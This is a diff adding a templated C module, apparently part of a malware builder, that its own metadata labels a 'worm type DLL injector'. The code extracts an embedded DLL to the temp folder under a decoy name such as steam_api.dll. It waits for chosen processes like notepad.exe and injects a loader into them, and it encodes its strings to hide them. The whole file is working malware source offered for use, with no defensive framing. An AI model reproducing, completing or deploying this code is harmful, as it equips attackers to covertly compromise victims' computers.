@@ -1,0 +1,159 @@
+#!name##DropZone
+#!itemType##worm
+#!info##New Worm type DLL Injector written in C and Assembly, using NT functions. After execution, it extracts the DLL file from itself,
+#!info## waits for the specified process, and injects code responsible for loading the DLL.
+#!info## The module also allows execution of two selected exported DLL functions together with custom arguments.
+#!itemTags##WIN##EXE
+#!wormCompiler##Basic-C
+#!Wprocess##CoffProc
+#!lang##c
+#!inFile##Robbo2Base_C##robbo2_base.c
+#!inFile##Robbo2Base_H##robbo2_base.h
+#!inFile##Robbo2Locust_C##robbo2_locust.c
+#!inFile##Robbo2Locust_H##robbo2_locust.h
+#!inFile##Robbo2Proc_C##robbo2_proc.c
+#!inFile##Robbo2Proc_H##robbo2_proc.h
+#!inFile##Robbo2##robbo2.h
+#!reqMod##ChipAndDale
+#!typeAccept##dll
+#!modCOFF##DROP_ZONE_COFF_OBJ##dll
+#!Var##DZONE_target##mspaint.exe, notepad.exe##Names of the processes into which the DLL will be injected.. Separate names with commas ","##str
+#!Var##DZONE_dll_name##steam_api.dll##Name of the DLL file under which it will be saved.##str
+#!Var##DZONE_delay##2000##Delay in milliseconds for a process to load a DLL.##str
+#!Var##DZONE_fexe1##0##Name of the first DLL function that will be executed after injection. If the function is not needed, leave "0".##str
+#!Var##DZONE_arg1##0##Argument passed to the first executed function. If no argument is required, leave "0".##str
+#!Var##DZONE_fexe2##0##Name of the second DLL function that will be executed after injection. If the function is not needed, leave "0".##str
+#!Var##DZONE_arg2##0##Argument passed to the second executed function. If no argument is required, leave "0".##str
+#!Var##DZONE_fdelay##0##Delay in milliseconds between function executions. If no delay is needed, set "0".##str
+
+
+{% set DROP_ZONE_TARGET_PROC = _ROBBO.EncodeList(DZONE_target, ",") %}
+
+{% if DZONE_fexe1 == "0" or DZONE_fexe1 == 0 %}
+    {% set DROP_ZONE_FEXE1 = 0 %}
+{% else %}
+    {% set DROP_ZONE_FEXE1 = '"%s"' %DZONE_fexe1 %}
+{% endif %}
+
+{% if DZONE_fexe2 == "0" or DZONE_fexe2 == 0 %}
+    {% set DROP_ZONE_FEXE2 = 0 %}
+{% else %}
+    {% set DROP_ZONE_FEXE2 = '"%s"' %DZONE_fexe2 %}
+{% endif %}
+
+{% if DZONE_arg1 == "0" or DZONE_arg1 == 0 %}
+    {% set DROP_ZONE_ARG1 = 0 %}
+    {% set DROP_ZONE_ARG1_SIZE = 0 %}
+{% else %}
+    {% set DROP_ZONE_ARG1 = '"%s"' %DZONE_arg1 %}
+    {% set DROP_ZONE_ARG1_SIZE = DROP_ZONE_ARG1|length %}
+{% endif %}
+
+{% if DZONE_arg2 == "0" or DZONE_arg2 == 0 %}
+    {% set DROP_ZONE_ARG2 = 0 %}
+    {% set DROP_ZONE_ARG2_SIZE = 0 %}
+{% else %}
+    {% set DROP_ZONE_ARG2 = '"%s"' %DZONE_arg2 %}
+    {% set DROP_ZONE_ARG2_SIZE = DROP_ZONE_ARG2|length %}
+{% endif %}
+
+
+
+#define ROBBO_PROC
+#include "robbo2.h"
+#include <stdio.h>
+
+#define DROPZ_TARGET_PROC_NAME_SIZE 256
+#define DROPZ_PAUSE_FIND_PROC 3
+#define DROPZ_TARGET_PATH_SIZE 1024
+
+extern const unsigned char _binary_{{DROP_ZONE_COFF_OBJ}}_start[];
+extern const unsigned char _binary_{{DROP_ZONE_COFF_OBJ}}_end[];
+
+int dropz_target_process[][DROPZ_TARGET_PROC_NAME_SIZE] = {
+    {{DROP_ZONE_TARGET_PROC}},
+    // NULL
+    {0x00}
+};
+
+int dropz_raw_dll_name[] = {
+    {{_ROBBO.EncodeStr(DZONE_dll_name)}}
+};
+
+int dropz_target_proc_size(void) {
+    int lsize = 0;
+    while (1) {
+        if (dropz_target_process[lsize][0] == 0x00) {
+            break;
+        }
+        lsize++;
+    }
+    return lsize;
+}
+
+DWORD dropz_wait_for_process(void) {
+    char *proc_name = malloc(256);
+    char *buff_name = malloc(256);
+    int tar_size = dropz_target_proc_size();
+    HANDLE proc;
+    DWORD tar_pid;
+    while (1) {
+        pROBBO_PROC_PID_LIST pids = robbo_proc_get_pid_list(1024);
+        for (int i=0; i<pids->size; i++) {
+            proc = robbo_locust_open_process_info(pids->list[i]);
+            if (!proc) {
+                continue;
+            }
+            robbo_wapi_GetModuleBaseNameA(proc, 0, proc_name, 256);
+            for (int x=0; x<tar_size; x++) {
+                robbo_decode2(dropz_target_process[x], buff_name, 256);
+                if (strcmp(proc_name, buff_name) == 0) {
+                    tar_pid = pids->list[i];
+                    free(proc_name);
+                    free(buff_name);
+                    pids->clear(pids);
+                    robbo_wapi_NtClose(proc);
+                    return tar_pid;
+                }
+            }
+        }
+        pids->clear(pids);
+        robbo_wapi_Sleep(DROPZ_PAUSE_FIND_PROC * 1000);
+    }
+}
+
+char* dropz_get_target_path(void) {
+    char *temp_path = malloc(DROPZ_TARGET_PATH_SIZE);
+    memset(temp_path, 0, DROPZ_TARGET_PATH_SIZE);
+    robbo_wapi_GetTempPathA(DROPZ_TARGET_PATH_SIZE, temp_path);
+    char dll_name[128];
+    robbo_decode2(dropz_raw_dll_name, dll_name, 128);
+    char *dll_path = malloc(DROPZ_TARGET_PATH_SIZE);
+    memset(dll_path, 0, DROPZ_TARGET_PATH_SIZE);
+    sprintf(dll_path, "%s%s", temp_path, dll_name);
+    free(temp_path);
+    return dll_path;
+}
+
+int main(int argc, char *argv[]) {
+    robbo_initialize();
+    robbo_locust_initialize();
+    const unsigned char *file_data = _binary_{{DROP_ZONE_COFF_OBJ}}_start;
+    int data_size = _binary_{{DROP_ZONE_COFF_OBJ}}_end - _binary_{{DROP_ZONE_COFF_OBJ}}_start;
+    HANDLE fhandle;
+    char *dll_path = dropz_get_target_path();
+    robbo_proc_create_file(fhandle, dll_path, (void*)file_data, data_size);
+    
+    pROBBO_PAYLOAD_INJECT_DLL payload = robbo_build_payload_dll_inject(dll_path, {{DROP_ZONE_FEXE1}}, {{DROP_ZONE_ARG1}}, {{DROP_ZONE_ARG1_SIZE}}, {{DROP_ZONE_FEXE2}}, {{DROP_ZONE_ARG2}}, {{DROP_ZONE_ARG2_SIZE}}, {{DZONE_fdelay}}, {{DZONE_delay}});
+    DWORD tar_pid;
+    while(1) {
+        tar_pid = dropz_wait_for_process();
+        NTSTATUS result = robbo_proc_inject_dll(tar_pid, payload);
+        if (result == 1) {
+            break;
+        }
+    }
+
+
+    return 0;
+}
